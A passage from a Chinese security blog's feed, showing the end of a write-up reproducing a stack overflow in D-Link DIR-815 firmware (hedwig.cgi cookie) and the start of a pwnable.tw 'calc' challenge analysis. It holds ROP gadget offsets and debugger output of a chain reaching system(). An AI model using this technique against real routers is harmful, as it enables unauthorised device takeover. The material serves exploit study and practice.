class="line">f.write(pd)</span><br></pre></td></tr></table></figure><p>在<code>./.gdbinit</code>下写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set architecture mips</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure><p>&nbsp; &nbsp; 用<code>sudo ./exp.sh -g</code>启动脚本。若在另一个命令行输入<code>gdb-multiarch ./htdocs/web/hedwig.cgi</code>，则用<code>pwndbg</code>进行调试。也可以用<code>ida attach</code>上进程进行调试。函数最终执行到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:00409A28 lw      $ra, 0x4C0+var_s24($sp)</span><br><span class="line">.text:00409A2C move    $v0, $s7</span><br><span class="line">.text:00409A30 lw      $fp, 0x4C0+var_s20($sp)</span><br><span class="line">.text:00409A34 lw      $s7, 0x4C0+var_s1C($sp)</span><br><span class="line">.text:00409A38 lw      $s6, 0x4C0+var_s18($sp)</span><br><span class="line">.text:00409A3C lw      $s5, 0x4C0+var_s14($sp)</span><br><span class="line">.text:00409A40 lw      $s4, 0x4C0+var_s10($sp)</span><br><span class="line">.text:00409A44 lw      $s3, 0x4C0+var_sC($sp)</span><br><span class="line">.text:00409A48 lw      $s2, 0x4C0+var_s8($sp)</span><br><span class="line">.text:00409A4C lw      $s1, 0x4C0+var_s4($sp)</span><br><span class="line">.text:00409A50 lw      $s0, 0x4C0+var_s0($sp)</span><br><span class="line">.text:00409A54 jr      $ra</span><br></pre></td></tr></table></figure><p>&nbsp; &nbsp; &nbsp; &nbsp; 查看栈上内容发现已被传入的<code>cookie</code>值覆盖。考虑通过控制这些寄存器的值来控制程序执行流。这个地方需要注意不能用程序原有的<code>gadgets</code>，因为地址中有<code>\0</code>被截断。需要利用<code>libc</code>中的<code>gadgets</code>。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 先找到运行时的基地址。程序貌似什么保护都没开所以所有地址都是固定的。同样符合动态链接第一次执行时先对符号进行链接的规则。在第二次调用<code>sprintf</code>处下断点，得到了<code>sprintf</code>地址。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; <code>ldd</code>一下程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ling@ubuntu:~/iot/jm/dir815_FW_101/_DIR-815 FW 1.01b14_1.01b14.bin.extracted/squashfs-root$ ldd ./htdocs/cgibin</span><br><span class="line">checking sub-depends for &#x27;not found&#x27;</span><br><span class="line">checking sub-depends for &#x27;not found&#x27;</span><br><span class="line">libgcc_s.so.1 =&gt; not found (0x00000000)</span><br><span class="line">libc.so.0 =&gt; not found (0x00000000)</span><br><span class="line">/lib/ld-uClibc.so.0 =&gt; /lib/ld-uClibc.so.0 (0x00000000)</span><br></pre></td></tr></table></figure><p>&nbsp; &nbsp; &nbsp; &nbsp; 把<code>libc.so.0</code>链接的文件拖入<code>ida</code>分析，找到<code>sprintf</code>的偏移。用上面得到的<code>sprintf</code>地址减去偏移得到基地址。（用这个办法主要是因为我用不了<code>vmmap</code>…）接着找到<code>system</code>偏移为<code>0x53200</code>，同样会被截断，考虑运算后再得到<code>0x53200</code>。</p><h2 id="构造ROP链"><a href="#构造ROP链" class="headerlink" title="构造ROP链"></a>构造ROP链</h2><p>接下来找<code>libc</code>里能用的<code>gadgets</code>。在<code>idapython</code>里输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> mipsrop <span class="keyword">import</span> MIPSROPFinder</span><br><span class="line">mips=MIPSROPFinder()</span><br><span class="line"><span class="comment"># 调用mips.find(&#x27;&#x27;)得到相应的gadgets</span></span><br></pre></td></tr></table></figure><p>先将<code>$s0</code>覆盖为<code>base+0x531ff</code>，再对<code>$s0+1</code>。</p><p><img src="https://i.loli.net/2021/11/03/cCHxP1ZOpTq8IGK.png" alt="idapython.jpg"></p><p>查看偏移处内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:000158C8                 move    $t9, $s5</span><br><span class="line">.text:000158CC                 jalr    $t9</span><br><span class="line">.text:000158D0                 addiu   $s0, 1</span><br></pre></td></tr></table></figure><blockquote><p> 这里注意一下指令执行的顺序。在<code>ida</code>的<code>python</code>框里输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mipsrop</span><br><span class="line"><span class="built_in">help</span>(mipsrop)</span><br></pre></td></tr></table></figure><p>文档里有这么一句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#    move $t9, $s1</span><br><span class="line">#    jalr $t9</span><br><span class="line">#    li $a0, 1    &lt;-- Remember MIPS has jump delay slots, so this instruction</span><br><span class="line">#    is executed with the jump</span><br></pre></td></tr></table></figure><p>查了一下说由于这个什么延迟机制，<code>jalr</code>后的语句（不知道几条）在执行<code>jalr</code>之前执行。找了个<code>jalr</code>在后一句下了断点，确实是在该句执行完后才执行的<code>jalr</code>。（大概和流水线、编译原理、<code>CPU</code>有关，尚未深究……）</p></blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 得到了一条<code>gadget</code>。同样由于这个机制，在执行到结尾时，会先执行<code>00409A58</code>处将栈恢复，此时就可以在离<code>$sp</code>较近的位置找到输入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00409A28                 lw      $ra, 0x4C0+var_s24($sp)</span><br><span class="line">.text:00409A2C                 move    $v0, $s7</span><br><span class="line">.text:00409A30                 lw      $fp, 0x4C0+var_s20($sp)</span><br><span class="line">.text:00409A34                 lw      $s7, 0x4C0+var_s1C($sp)</span><br><span class="line">...</span><br><span class="line">.text:00409A50                 lw      $s0, 0x4C0+var_s0($sp)</span><br><span class="line">.text:00409A54                 jr      $ra</span><br><span class="line">.text:00409A58                 addiu   $sp, 0x4E8</span><br></pre></td></tr></table></figure><p>&nbsp; &nbsp; &nbsp; &nbsp; 再找给<code>system</code>传参的<code>gadget</code>。需将<code>/bin//sh</code>字符串地址传给<code>$a0</code>。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 执行<code>mips.stackfinders()</code>，找到这样一条比较方便。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000159CC  |  addiu $s5,$sp,0x14C+var_13C                      |  jalr  $s0    |</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:000159CC                 addiu   $s5, $sp, 0x14C+var_13C</span><br><span class="line">.text:000159D0                 move    $a1, $s3</span><br><span class="line">.text:000159D4                 move    $a2, $s1</span><br><span class="line">.text:000159D8                 move    $t9, $s0</span><br><span class="line">.text:000159DC                 jalr    $t9 ; mempcpy</span><br><span class="line">.text:000159E0                 move    $a0, $s5</span><br></pre></td></tr></table></figure><p>最后构造好运行的结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; n</span><br><span class="line">0x7678b204 in system () from /home/ling/iot/jm/dir815_FW_101/_DIR-815 FW 1.01b14_1.01b14.bin.extracted/squashfs-root/lib/libuClibc-0.9.30.1.so</span><br><span class="line">warning: GDB can&#x27;t find the start of the function at 0x7674d9e3.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> V0   0x0</span><br><span class="line"> V1   0x4b</span><br><span class="line"> A0   0x76fff230 ◂— &#x27;/bin/ls&#x27;</span><br><span class="line"> A1   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> A2   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> A3   0x20</span><br><span class="line"> T0   0x767ab4c8 (__malloc_state) ◂— 0x4b /* &#x27;K&#x27; */</span><br><span class="line"> T1   0x16f1</span><br><span class="line"> T2   0x2</span><br><span class="line"> T3   0x24</span><br><span class="line"> T4   0x25</span><br><span class="line"> T5   0x807</span><br><span class="line"> T6   0x800</span><br><span class="line"> T7   0x400</span><br><span class="line"> T8   0x8</span><br><span class="line"> T9   0x7678b200 (system) ◂— lui    $gp, 2 /* 0x3c1c0002 */</span><br><span class="line"> S0   0x7678b200 (system) ◂— lui    $gp, 2 /* 0x3c1c0002 */</span><br><span class="line"> S1   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S2   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S3   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S4   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S5   0x76fff230 ◂— &#x27;/bin/ls&#x27;</span><br><span class="line"> S6   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S7   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S8   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> FP   0x76fff220 ◂— &#x27;bbbbbbbbbbbbbbbb/bin/ls&#x27;</span><br><span class="line"> SP   0x76fff220 ◂— &#x27;bbbbbbbbbbbbbbbb/bin/ls&#x27;</span><br><span class="line">*PC   0x7678b204 (system+4) ◂— addiu  $gp, $gp, 0x32e0 /* 0x279c32e0 */</span><br><span class="line">───────────────────[ DISASM ]───────────────────</span><br><span class="line">   0x7678b200 &lt;system&gt;       lui    $gp, 2</span><br><span class="line"> ► 0x7678b204 &lt;system+4&gt;     addiu  $gp, $gp, 0x32e0</span><br><span class="line">   0x7678b208 &lt;system+8&gt;     addu   $gp, $gp, $t9</span><br><span class="line">   0x7678b20c &lt;system+12&gt;    addiu  $sp, $sp, -0x48</span><br><span class="line">   0x7678b210 &lt;system+16&gt;    sw     $ra, 0x44($sp)</span><br><span class="line">   0x7678b214 &lt;system+20&gt;    sw     $s5, 0x40($sp)</span><br><span class="line">   0x7678b218 &lt;system+24&gt;    sw     $s4, 0x3c($sp)</span><br><span class="line">   0x7678b21c &lt;system+28&gt;    sw     $s3, 0x38($sp)</span><br><span class="line">   0x7678b220 &lt;system+32&gt;    sw     $s2, 0x34($sp)</span><br><span class="line">   0x7678b224 &lt;system+36&gt;    sw     $s1, 0x30($sp)</span><br><span class="line">   0x7678b228 &lt;system+40&gt;    sw     $s0, 0x2c($sp)</span><br><span class="line">──────────────────────[ STACK ]──────────────────────────</span><br><span class="line">00:0000│ fp sp 0x76fff220 ◂— &#x27;bbbbbbbbbbbbbbbb/bin/ls&#x27;</span><br><span class="line">... ↓          3 skipped</span><br><span class="line">04:0010│ a0 s5 0x76fff230 ◂— &#x27;/bin/ls&#x27;</span><br><span class="line">05:0014│       0x76fff234 ◂— 0x736c2f /* &#x27;/ls&#x27; */</span><br><span class="line">06:0018│       0x76fff238 ◂— 0</span><br><span class="line">07:001c│       0x76fff23c ◂— 0</span><br><span class="line">──────────────────────[ BACKTRACE ]────────────────────────</span><br><span class="line"> ► f 0 0x7678b204 system+4</span><br><span class="line">───────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><p>但最后还是报了段错误，而且貌似继续执行<code>gadget2</code>后面的指令了。。不太明白。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">warning: GDB can&#x27;t find the start of the function at 0x7674d9e4.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x7674d9e4 in ?? () from /home/ling/iot/jm/dir815_FW_101/_DIR-815 FW 1.01b14_1.01b14.bin.extracted/squashfs-root/lib/libuClibc-0.9.30.1.so</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line">*V0   0x7f00</span><br><span class="line">*V1   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">*A0   0x76fff148 ◂— sll    $zero, $v0, 0 /* 0x20000 */</span><br><span class="line">*A1   0x76fff0f0 ◂— 0</span><br><span class="line">*A2   0x0</span><br><span class="line">*A3   0x0</span><br><span class="line"> T0   0x767ab4c8 (__malloc_state) ◂— 0x4b /* &#x27;K&#x27; */</span><br><span class="line"> T1   0x16f1</span><br><span class="line"> T2   0x2</span><br><span class="line"> T3   0x24</span><br><span class="line"> T4   0x25</span><br><span class="line"> T5   0x807</span><br><span class="line"> T6   0x800</span><br><span class="line"> T7   0x400</span><br><span class="line"> T8   0x8</span><br><span class="line">*T9   0x7676c8c0 (memcpy) ◂— b      0x7676c8d8 /* 0x10000005 */</span><br><span class="line"> S0   0x7678b200 (system) ◂— lui    $gp, 2 /* 0x3c1c0002 */</span><br><span class="line"> S1   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S2   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S3   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S4   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S5   0x76fff230 ◂— &#x27;/bin/ls&#x27;</span><br><span class="line"> S6   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S7   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> S8   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">*FP   0x0</span><br><span class="line"> SP   0x76fff220 ◂— &#x27;bbbbbbbbbbbbbbbb/bin/ls&#x27;</span><br><span class="line">*PC   0x7674d9e4 ◂— 0x8fdc0010</span><br><span class="line">────────────────────────────[ DISASM ]──────────────────────</span><br><span class="line">   0x7674d9d0    move   $a1, $s3</span><br><span class="line">   0x7674d9d4    move   $a2, $s1</span><br><span class="line">   0x7674d9d8    move   $t9, $s0</span><br><span class="line">   0x7674d9dc    jalr   $t9</span><br><span class="line"> </span><br><span class="line">   0x7674d9e0    move   $a0, $s5</span><br><span class="line"> ► 0x7674d9e4    lw     $gp, 0x10($fp)</span><br><span class="line">   0x7674d9e8    move   $a0, $v0</span><br><span class="line">   0x7674d9ec    lw     $a1, -0x7fac($gp)</span><br><span class="line">   0x7674d9f0    addiu  $a2, $zero, 1</span><br><span class="line">   0x7674d9f4    move   $t9, $s0</span><br><span class="line">   0x7674d9f8    jalr   $t9</span><br><span class="line">────────────────[ STACK ]────────────────────────────────</span><br><span class="line">00:0000│ sp 0x76fff220 ◂— &#x27;bbbbbbbbbbbbbbbb/bin/ls&#x27;</span><br><span class="line">... ↓       3 skipped</span><br><span class="line">04:0010│ s5 0x76fff230 ◂— &#x27;/bin/ls&#x27;</span><br><span class="line">05:0014│    0x76fff234 ◂— 0x736c2f /* &#x27;/ls&#x27; */</span><br><span class="line">06:0018│    0x76fff238 ◂— 0</span><br><span class="line">07:001c│    0x76fff23c ◂— 0</span><br><span class="line">──────────────────[ BACKTRACE ]─────────────────────</span><br><span class="line"> ► f 0 0x7674d9e4</span><br><span class="line">─────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><p>&nbsp; &nbsp; &nbsp; &nbsp; 跟着书上到这里结束。<del>下面的我也不知道对不对反正是猜着做的.jpg</del></p><p>&nbsp; &nbsp; &nbsp; &nbsp; 尝试把文件系统搬到<code>qemu</code>虚拟机里做一下（虽然应该没什么卵用）。先解决虚拟机和主机通信的问题。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta -kernel vmlinux-2.6.32-5-4kc-malta_mipsel -hda debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic, -net tap -nographic</span><br></pre></td></tr></table></figure><p>&nbsp; &nbsp; &nbsp; &nbsp; 在用上面的命令启动时会添加一块网卡，我的名称是<code>tap1</code>。主机里进行配置<code>sudo ifconfig tap1 10.10.10.1/24</code>，打开虚拟机后<code>ifconfig eth0 10.10.10.2/24</code>。两台就能互相<code>ping</code>通了。<code>scp</code>将文件系统拷贝到虚拟机中，此时还需要挂载<code>/proc /sys /dev</code>几个目录。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mount --bind /proc squashfs-root/proc/</span><br><span class="line">mount --bind /sys squashfs-root/sys</span><br><span class="line">mount --bind /dev squashfs-root/dev   </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不知道直接挂虚拟机的行不行…反正设备文件有缺失</span></span><br><span class="line">chroot squashfs-root /bin/sh</span><br></pre></td></tr></table></figure><p>&nbsp; &nbsp; &nbsp; &nbsp; 执行<code>/etc/init.d/rcS</code>还是<code>/etc/init0.d/rcS</code>启动，反正都报错了。好了我不行了再见.jpg。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ps：我也不知道该学点啥，但是大佬们都有自己研究方向那我找个学术界研究的多点的学吧emm。各个方向能做到的都挺牛逼的就是没感觉自己对哪个有倾向性…</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 《揭秘》的第一个漏洞分析。&lt;/p&gt;</summary>
    
    
    
    
    <category term="漏洞复现" scheme="http://ll1ng.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>unpwnable( 01</title>
    <link href="http://ll1ng.github.io/2021/08/10/unpwnable-01/"/>
    <id>http://ll1ng.github.io/2021/08/10/unpwnable-01/</id>
    <published>2021-08-09T16:54:25.000Z</published>
    <updated>2021-08-09T16:54:25.000Z</updated>
    
    <content type="html"><![CDATA[<p>calc dubblesort applestore</p><span id="more"></span><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>逻辑漏洞造成可以泄露栈上内容以及写栈上返回地址</p><p>程序实现了简单计算器的功能。主函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">calc</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result[<span class="number">101</span>]; <span class="comment">// [esp+18h] [ebp-5A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> expr[<span class="number">1024</span>]; <span class="comment">// [esp+1ACh] [ebp-40Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+5ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    bzero(expr, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( !get_expr(expr, <span class="number">1024</span>) )                <span class="comment">// 过滤掉数字和+-*/%以外的字符</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    init_pool(result);                          <span class="comment">// 初始化存放数字的数组result</span></span><br><span class="line">    <span class="keyword">if</span> ( parse_expr(expr, result) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, result[result[<span class="number">0</span>]]);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中出现漏洞的函数是<code>parse_expr</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">parse_expr</span><span class="params">(<span class="type">char</span> *expr, <span class="type">int</span> *num_pool)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *old_opera_plus1; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="type">int</span> opera_start_idx; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="type">int</span> len; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">char</span> *num_str; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="type">char</span> opera_pool[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  old_opera_plus1 = expr;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  bzero(opera_pool, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( opera_start_idx = <span class="number">0</span>; ; ++opera_start_idx )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( expr[opera_start_idx] - (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&#x27;0&#x27;</span> &gt; <span class="number">9</span> )<span class="comment">// operator</span></span><br><span class="line">    &#123;</span><br><span class="line">      len = &amp;expr[opera_start_idx] - old_opera_plus1;<span class="comment">//数字字符串长度，old_opera_plus1即数字字符串起始位置</span></span><br><span class="line">      num_str = (<span class="type">char</span> *)<span class="built_in">malloc</span>(len + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">memcpy</span>(num_str, old_opera_plus1, len);</span><br><span class="line">      num_str[len] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(num_str, <span class="string">&quot;0&quot;</span>) )              <span class="comment">// after operator can&#x27;t be 0</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;prevent division by zero&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      num = atoi(num_str);</span><br><span class="line">      <span class="keyword">if</span> ( num &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = (*num_pool)++;           <span class="comment">//num_pool[0]存放的是数字个数</span></span><br><span class="line">        num_pool[v3 + <span class="number">1</span>] = num;       <span class="comment">//在之前个数+1的位置放入当前数字</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( expr[opera_start_idx] &amp;&amp; expr[opera_start_idx + <span class="number">1</span>] - (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&#x27;0&#x27;</span> &gt; <span class="number">9</span> )<span class="comment">// opera+1-&gt;opera 避免了出现连续出现运算符或运算符后没有数的情况</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;expression error!&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      old_opera_plus1 = &amp;expr[opera_start_idx + <span class="number">1</span>];</span><br><span class="line">      <span class="keyword">if</span> ( opera_pool[v6] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( expr[opera_start_idx] )        </span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">          <span 